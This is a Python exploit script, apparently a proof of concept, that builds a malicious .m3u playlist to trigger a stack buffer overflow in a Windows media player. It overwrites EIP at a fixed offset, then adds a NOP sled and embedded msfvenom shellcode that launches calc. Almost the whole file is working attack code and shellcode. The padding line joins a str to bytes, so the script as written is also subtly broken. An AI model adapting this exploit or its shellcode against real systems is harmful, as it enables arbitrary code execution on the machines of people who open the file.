#!/usr/bin/env python3
# shanekhantaun9
import struct

# msfvenom -p 'windows/exec' CMD='calc'  -f 'python' -b "0x00,0x0a,0x0d"

buf =  b""
buf += b"\x31\xc9\x83\xe9\xd0\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\x22\xf9\xe4\xa3\x83\xee\xfc\xe2\xf4"
buf += b"\xde\x11\x66\xa3\x22\xf9\x84\x2a\xc7\xc8\x24\xc7"
buf += b"\xa9\xa9\xd4\x28\x70\xf5\x6f\xf1\x36\x72\x96\x8b"
buf += b"\x2d\x4e\xae\x85\x13\x06\x48\x9f\x43\x85\xe6\x8f"
buf += b"\x02\x38\x2b\xae\x23\x3e\x06\x51\x70\xae\x6f\xf1"
buf += b"\x32\x72\xae\x9f\xa9\xb5\xf5\xdb\xc1\xb1\xe5\x72"
buf += b"\x73\x72\xbd\x83\x23\x2a\x6f\xea\x3a\x1a\xde\xea"
buf += b"\xa9\xcd\x6f\xa2\xf4\xc8\x1b\x0f\xe3\x36\xe9\xa2"
buf += b"\xe5\xc1\x04\xd6\xd4\xfa\x99\x5b\x19\x84\xc0\xd6"
buf += b"\xc6\xa1\x6f\xfb\x06\xf8\x37\xc5\xa9\xf5\xaf\x28"
buf += b"\x7a\xe5\xe5\x70\xa9\xfd\x6f\xa2\xf2\x70\xa0\x87"
buf += b"\x06\xa2\xbf\xc2\x7b\xa3\xb5\x5c\xc2\xa6\xbb\xf9"
buf += b"\xa9\xeb\x0f\x2e\x7f\x93\xe5\x2e\xa7\x4b\xe4\xa3"
buf += b"\x22\xa9\x8c\x92\xa9\x96\x63\x5c\xf7\x42\x14\x16"
buf += b"\x80\xaf\x8c\x05\xb7\x44\x79\x5c\xf7\xc5\xe2\xdf"
buf += b"\x28\x79\x1f\x43\x57\xfc\x5f\xe4\x31\x8b\x8b\xc9"
buf += b"\x22\xaa\x1b\x76\x41\x98\x88\xc0\x22\xf9\xe4\xa3"

def exploit():
	junk = b"A" * 26077
	EIP = struct.pack('<I', 0x1001B058)
	preshell = b"XXXX"
	nops = b"\x90" * 16
	padding = "A" * (30000 - len(junk)- 4 - 4 - 16 -len(buf))

	data = junk + EIP + preshell + nops + buf + padding

	with open('exploit.m3u', 'wb') as f:
		f.write(data)

	print("[+] File created")
	
exploit()
